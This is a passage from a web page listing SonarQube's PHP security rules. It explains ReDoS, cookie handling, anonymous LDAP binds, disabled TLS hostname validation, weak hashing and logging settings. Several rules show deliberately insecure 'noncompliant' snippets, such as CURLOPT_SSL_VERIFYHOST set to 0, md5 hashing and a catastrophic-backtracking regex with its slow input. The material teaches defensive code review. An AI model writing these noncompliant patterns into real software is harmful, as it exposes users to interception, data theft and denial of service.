  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/1004" rel="nofollow">MITRE, CWE-1004</a> - Sensitive Cookie Without &#39;HttpOnly&#39; Flag </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE" rel="nofollow">HTTPONLY_COOKIE</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4784">
              php:S4784
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;phpsecurity%3AS2631&amp;rule_key&#61;phpsecurity%3AS2631" rel="nofollow">S2631</a> instead.</p>
<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-16021" rel="nofollow">CVE-2017-16021</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-13863" rel="nofollow">CVE-2018-13863</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-8926" rel="nofollow">CVE-2018-8926</a> </li></ul>
<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as
<code>/(a&#43;)&#43;s/</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with
every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a&#43;s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating such regular expressions opens the door to <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">Regular expression Denial of Service (ReDoS)</a> attacks.
In the context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making
the service inaccessible to genuine users.</p>
<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and contains at at least two instances of any of
the following characters <code>*&#43;{<!-- --></code>.</p>
<p>Example: <code>(a&#43;)*</code></p>
<p>The following functions are detected as executing regular expressions:</p>
<ul><li> <a href="http://php.net/manual/en/book.pcre.php" rel="nofollow">PCRE</a>: Perl style regular expressions: <a href="http://php.net/manual/en/function.preg-filter.php" rel="nofollow">preg_filter</a>, <a href="http://php.net/manual/en/function.preg-grep.php" rel="nofollow">preg_grep</a>,
  <a href="http://php.net/manual/en/function.preg-match-all.php" rel="nofollow">preg_match_all</a>, <a href="http://php.net/manual/en/function.preg-match.php" rel="nofollow">preg_match</a>, <a href="http://php.net/manual/en/function.preg-replace-callback.php" rel="nofollow">preg_replace_callback</a>, <a href="http://php.net/manual/en/function.preg-replace.php" rel="nofollow">preg_replace</a>, <a href="http://php.net/manual/en/function.preg-split.php" rel="nofollow">preg_split</a> </li><li> <a href="http://php.net/manual/en/book.regex.php" rel="nofollow">POSIX extended</a>, which are deprecated: <a href="http://php.net/manual/en/function.ereg-replace.php" rel="nofollow">ereg_replace</a>, <a href="http://php.net/manual/en/function.ereg.php" rel="nofollow">ereg</a>, <a href="http://php.net/manual/en/function.eregi-replace.php" rel="nofollow">eregi_replace</a>, <a href="http://php.net/manual/en/function.eregi.php" rel="nofollow">eregi</a>, <a href="http://php.net/manual/en/function.split.php" rel="nofollow">split</a>, <a href="http://php.net/manual/en/function.spliti.php" rel="nofollow">spliti</a>. </li><li> <a href="http://php.net/manual/en/function.fnmatch.php" rel="nofollow">fnmatch</a> </li><li> Any of the multibyte string regular expressions: <a href="http://php.net/manual/en/function.mb-eregi-replace.php" rel="nofollow">mb_eregi_replace</a>, <a href="http://php.net/manual/en/function.mb-ereg-match.php" rel="nofollow">mb_ereg_match</a>, <a href="http://php.net/manual/en/function.mb-ereg-replace-callback.php" rel="nofollow">mb_ereg_replace_callback</a>, <a href="http://php.net/manual/en/function.mb-ereg-replace.php" rel="nofollow">mb_ereg_replace</a>, <a href="http://php.net/manual/en/function.mb-ereg-search-init.php" rel="nofollow">mb_ereg_search_init</a>, <a href="http://php.net/manual/en/function.mb-ereg-search-pos.php" rel="nofollow">mb_ereg_search_pos</a>, <a href="http://php.net/manual/en/function.mb-ereg-search-regs.php" rel="nofollow">mb_ereg_search_regs</a>, <a href="http://php.net/manual/en/function.mb-ereg-search.php" rel="nofollow">mb_ereg_search</a>, <a href="http://php.net/manual/en/function.mb-ereg.php" rel="nofollow">mb_ereg</a>,
  <a href="http://php.net/manual/en/function.mb-eregi-replace.php" rel="nofollow">mb_eregi_replace</a>, <a href="http://php.net/manual/en/function.mb-eregi.php" rel="nofollow">mb_eregi</a> </li></ul>
<p>Note that <code>ereg*</code> functions have been removed in PHP 7 and <strong>PHP 5 end of life date is the 1st of January 2019. Using PHP 5 is
dangerous as there will be no security fix</strong>.</p>
<p>This rule’s goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li><li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not set the constant <code>pcre.backtrack_limit</code> to a high value as it will increase the resource consumption of PCRE functions.</p>
<p>Check the error codes of PCRE functions via <code>preg_last_error</code>.</p>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you’re are using. Do not run vulnerable regular expressions on user input.</p>
<p>Use if possible a library which is not vulnerable to Redos Attacks such as <a href="https://github.com/google/re2" rel="nofollow">Google Re2</a>.</p>
<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won’t detect this kind of injection.</p>
<p>Avoid executing a user input string as a regular expression or use at least <code>preg_quote</code> to escape regular expression characters.</p>
<h2>Exceptions</h2>
<p>An issue will be created for the functions <code>mb_ereg_search_pos</code>, <code>mb_ereg_search_regs</code> and <code>mb_ereg_search</code> if and
only if at least the first argument, i.e. the $pattern, is provided.</p>
<p>The current implementation does not follow variables. It will only detect regular expressions hard-coded directly in the function call.</p>
<pre>
$pattern &#61; &#34;/(a&#43;)&#43;/&#34;;
$result &#61; eregi($pattern, $input);  // No issue will be raised even if it is Sensitive
</pre>
<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)&#43;</code>,
<code>(a|a?)&#43;</code>.</p>
<p>It is a good idea to test your regular expression if it has the same pattern on both side of a &#34;<code>|</code>&#34;.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">MITRE, CWE-624</a> - Executable Regular
  Expression Error </li><li> OWASP Regular expression Denial of Service - ReDoS </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3331">
              php:S3331
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>A cookie’s domain specifies which websites should be able to read it. Left blank, browsers are supposed to only send the cookie to sites that
exactly match the sending domain. For example, if a cookie was set by <em>lovely.dream.com</em>, it should only be readable by that domain, and not by
<em>nightmare.com</em> or even <em>strange.dream.com</em>. If you want to allow sub-domain access for a cookie, you can specify it by adding a dot in
front of the cookie’s domain, like so: <em>.dream.com</em>. But cookie domains should always use at least two levels.</p>
<p>Cookie domains can be set either programmatically or via configuration. This rule raises an issue when any cookie domain is set with a single
level, as in <em>.com</em>.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the <code>domain</code> attribute has only one level as domain naming. </li></ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> You should check the <code>domain</code> attribute has been set and its value has more than one level of domain nanimg, like:
  <em>sonarsource.com</em> </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
setcookie(&#34;TestCookie&#34;, $value, time()&#43;3600, &#34;/~path/&#34;, &#34;.com&#34;, 1); // Noncompliant
session_set_cookie_params(3600, &#34;/~path/&#34;, &#34;.com&#34;); // Noncompliant

// inside php.ini
session.cookie_domain&#61;&#34;.com&#34;; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
setcookie(&#34;TestCookie&#34;, $value, time()&#43;3600, &#34;/~path/&#34;, &#34;.myDomain.com&#34;, 1);
session_set_cookie_params(3600, &#34;/~path/&#34;, &#34;.myDomain.com&#34;);

// inside php.ini
session.cookie_domain&#61;&#34;.myDomain.com&#34;;
</pre>
<h2>See</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3338">
              php:S3338
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<h2>Why is this an issue?</h2>
<p><code>file_uploads</code> is an on-by-default PHP configuration that allows files to be uploaded to your site. Since accepting candy
files from strangers is inherently dangerous, this feature should be disabled unless it is absolutely necessary for your site.</p>
<p>This rule raises an issue when <code>file_uploads</code> is not explicitly disabled.</p>
<h3>Noncompliant code example</h3>
<pre>
; php.ini
file_uploads&#61;1  ; Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
; php.ini
file_uploads&#61;0
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/434" rel="nofollow">MITRE, CWE-434</a> - Unrestricted Upload of File with Dangerous Type </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2255">
              php:S2255
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-11639" rel="nofollow">CVE-2018-11639</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2016-6537" rel="nofollow">CVE-2016-6537</a> </li></ul>
<p>Attackers can use widely-available tools to read cookies. Any sensitive information they may contain will be exposed.</p>
<p>This rule flags code that writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> sensitive information is stored inside the cookie. </li></ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p>Using cookies only for session IDs doesn’t make them secure. Follow <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies" rel="nofollow">OWASP best practices</a> when you configure your
cookies.</p>
<p>As a side note, every information read from a cookie should be <a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitized</a>.</p>
<h2>Sensitive Code Example</h2>
<pre>
$value &#61; &#34;1234 1234 1234 1234&#34;;

// Review this cookie as it seems to send sensitive information (credit card number).
setcookie(&#34;CreditCardNumber&#34;, $value, $expire, $path, $domain, true, true); // Sensitive
setrawcookie(&#34;CreditCardNumber&#34;, $value, $expire, $path, $domain, true, true); // Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/312" rel="nofollow">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li><li> <a href="https://cwe.mitre.org/data/definitions/315" rel="nofollow">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li><li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE" rel="nofollow">COOKIE_USAGE</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4433">
              php:S4433
            </a>
          </td>
          <td>
            <details>
              <p>Lightweight Directory Access Protocol (LDAP) servers provide two main authentication methods: the <em>SASL</em> and <em>Simple</em> ones. The
<em>Simple Authentication</em> method also breaks down into three different mechanisms:</p>
<ul><li> <em>Anonymous</em> Authentication </li><li> <em>Unauthenticated</em> Authentication </li><li> <em>Name/Password</em> Authentication </li></ul>
<p>A server that accepts either the <em>Anonymous</em> or <em>Unauthenticated</em> mechanisms will accept connections from clients not providing
credentials.</p>
<h2>Why is this an issue?</h2>
<p>When configured to accept the Anonymous or Unauthenticated authentication mechanism, an LDAP server will accept connections from clients that do
not provide a password or other authentication credentials. Such users will be able to read or modify part or all of the data contained in the hosted
directory.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting unauthenticated access to an LDAP server can access the data that is stored in the corresponding directory. The impact
varies depending on the permission obtained on the directory and the type of data it stores.</p>
<h4>Authentication bypass</h4>
<p>If attackers get write access to the directory, they will be able to alter most of the data it stores. This might include sensitive technical data
such as user passwords or asset configurations. Such an attack can typically lead to an authentication bypass on applications and systems that use the
affected directory as an identity provider.</p>
<p>In such a case, all users configured in the directory might see their identity and privileges taken over.</p>
<h4>Sensitive information leak</h4>
<p>If attackers get read-only access to the directory, they will be able to read the data it stores. That data might include security-sensitive pieces
of information.</p>
<p>Typically, attackers might get access to user account lists that they can use in further intrusion steps. For example, they could use such lists to
perform password spraying, or related attacks, on all systems that rely on the affected directory as an identity provider.</p>
<p>If the directory contains some Personally Identifiable Information, an attacker accessing it might represent a violation of regulatory requirements
in some countries. For example, this kind of security event would go against the European GDPR law.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code indicates an anonymous LDAP authentication vulnerability because it binds to a remote server using an Anonymous Simple
authentication mechanism.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$ldapconn &#61; ldap_connect(&#34;ldap.example.com&#34;);

if ($ldapconn) {
    $ldapbind &#61; ldap_bind($ldapconn); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$ldaprdn  &#61; &#39;uname&#39;;
$ldappass &#61; &#39;password&#39;;

$ldapconn &#61; ldap_connect(&#34;ldap.example.com&#34;);

if ($ldapconn) {
    $ldapbind &#61; ldap_bind($ldapconn, $ldaprdn, $ldappass); // Compliant
}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://datatracker.ietf.org/doc/html/rfc4513#section-5" rel="nofollow">RFC 4513 - Lightweight Directory Access Protocol (LDAP): Authentication
  Methods and Security Mechanisms</a> - Bind operations </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/521" rel="nofollow">MITRE, CWE-521</a> - Weak Password Requirements </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5527">
              php:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
<h2>How to fix it in cURL</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
<p>The hostname validation gets disabled by setting <code>CURLOPT_SSL_VERIFYHOST</code> to <code>0 or false</code>. To enable validation set the value
to <code>2 or true</code> or do not set <code>CURLOPT_SSL_VERIFYHOST</code> at all to use the secure default value.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$curl &#61; curl_init();
curl_setopt($curl, CURLOPT_URL, &#39;https://example.com/&#39;);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);  // Noncompliant
curl_exec($curl);
curl_close($curl);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$curl &#61; curl_init();
curl_setopt($curl, CURLOPT_URL, &#39;https://example.com/&#39;);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
curl_exec($curl);
curl_close($curl);
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul><li> Create a self-signed certificate for that machine. </li><li> Add this self-signed certificate to the system’s trust store. </li><li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li></ul>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/297" rel="nofollow">MITRE, CWE-297</a> - Improper Validation of Certificate with Host Mismatch </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4790">
              php:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
$hash &#61; md5($data); // Sensitive
$hash &#61; sha1($data);   // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
// for a password
$hash &#61; password_hash($password, PASSWORD_BCRYPT); // Compliant

// other context
$hash &#61; hash(&#34;sha512&#34;, $data);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4792">
              php:S4792
            </a>
          </td>
          <td>
            <details>
              <p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-0285" rel="nofollow">CVE-2018-0285</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2000-1127" rel="nofollow">CVE-2000-1127</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-15113" rel="nofollow">CVE-2017-15113</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2015-5742" rel="nofollow">CVE-2015-5742</a> </li></ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul><li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li><li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li></ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li><li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li><li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li><li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li><li> the logs are only stored locally instead of being backuped or replicated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Check that your production deployment doesn’t have its loggers in &#34;debug&#34; mode as it might write sensitive information in logs. </li><li> Production logs should be stored in a secure location which is only accessible to system administrators. </li><li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li><li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li><li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li><li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li></ul>
<p>Remember that configuring loggers properly doesn’t make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul><li> Don’t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc…​ Usually any information which is protected by law is good candidate for removal. </li><li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc…​ As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li><li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li><li> Monitor the logs for any suspicious activity. </li></ul>
<h2>Sensitive Code Example</h2>
<p>Basic PHP configuration:</p>
<pre>
function configure_logging() {
  error_reporting(E_RECOVERABLE_ERROR); // Sensitive
  error_reporting(32); // Sensitive

  ini_set(&#39;docref_root&#39;, &#39;1&#39;); // Sensitive
  ini_set(&#39;display_errors&#39;, &#39;1&#39;); // Sensitive
  ini_set(&#39;display_startup_errors&#39;, &#39;1&#39;); // Sensitive
  ini_set(&#39;error_log&#39;, &#34;path/to/logfile&#34;); // Sensitive - check logfile is secure
  ini_set(&#39;error_reporting&#39;, E_PARSE ); // Sensitive
  ini_set(&#39;error_reporting&#39;, 64); // Sensitive
  ini_set(&#39;log_errors&#39;, &#39;0&#39;); // Sensitive
  ini_set(&#39;log_errors_max_length&#39;, &#39;512&#39;); // Sensitive
  ini_set(&#39;ignore_repeated_errors&#39;, &#39;1&#39;); // Sensitive
  ini_set(&#39;ignore_repeated_source&#39;, &#39;1&#39;); // Sensitive
  ini_set(&#39;track_errors&#39;, &#39;0&#39;); // Sensitive

  ini_alter(&#39;docref_root&#39;, &#39;1&#39;); // Sensitive
  ini_alter(&#39;display_errors&#39;, &#39;1&#39;); // Sensitive
  ini_alter(&#39;display_startup_errors&#39;, &#39;1&#39;); // Sensitive
  ini_alter(&#39;error_log&#39;, &#34;path/to/logfile&#34;); // Sensitive - check logfile is secure
  ini_alter(&#39;error_reporting&#39;, E_PARSE ); // Sensitive
  ini_alter(&#39;error_reporting&#39;, 64); // Sensitive
  ini_alter(&#39;log_errors&#39;, &#39;0&#39;); // Sensitive
  ini_alter(&#39;log_errors_max_length&#39;, &#39;512&#39;); // Sensitive
  ini_alter(&#39;ignore_repeated_errors&#39;, &#39;1&#39;); // Sensitive
  ini_alter(&#39;ignore_repeated_source&#39;, &#39;1&#39;); // Sensitive
  ini_alter(&#39;track_errors&#39;, &#39;0&#39;); // Sensitive
}
</pre>
<p>Definition of custom loggers with <code>psr/log</code></p>
<pre>
abstract class MyLogger implements \Psr\Log\LoggerInterface { // Sensitive
    // ...
}

abstract class MyLogger2 extends \Psr\Log\AbstractLogger { // Sensitive
    // ...
}

abstract class MyLogger3 {
    use \Psr\Log\LoggerTrait; // Sensitive
    // ...
}
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised for logger configuration when it follows <a href="https://www.loggly.com/ultimate-guide/php-logging-basics/" rel="nofollow">recommended
settings</a> for production servers. The following examples are all valid:</p>
<pre>
  ini_set(&#39;docref_root&#39;, &#39;0&#39;);
  ini_set(&#39;display_errors&#39;, &#39;0&#39;);
  ini_set(&#39;display_startup_errors&#39;, &#39;0&#39;);

  error_reporting(0);
  ini_set(&#39;error_reporting&#39;, 0);

  ini_set(&#39;log_errors&#39;, &#39;1&#39;);
  ini_set(&#39;log_errors_max_length&#39;, &#39;0&#39;);
  ini_set(&#39;ignore_repeated_errors&#39;, &#39;0&#39;);
  ini_set(&#39;ignore_repeated_source&#39;, &#39;0&#39;);
  ini_set(&#39;track_errors&#39;, &#39;1&#39;);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" rel="nofollow">OWASP Top 10 2021 Category A9</a> - Security Logging and
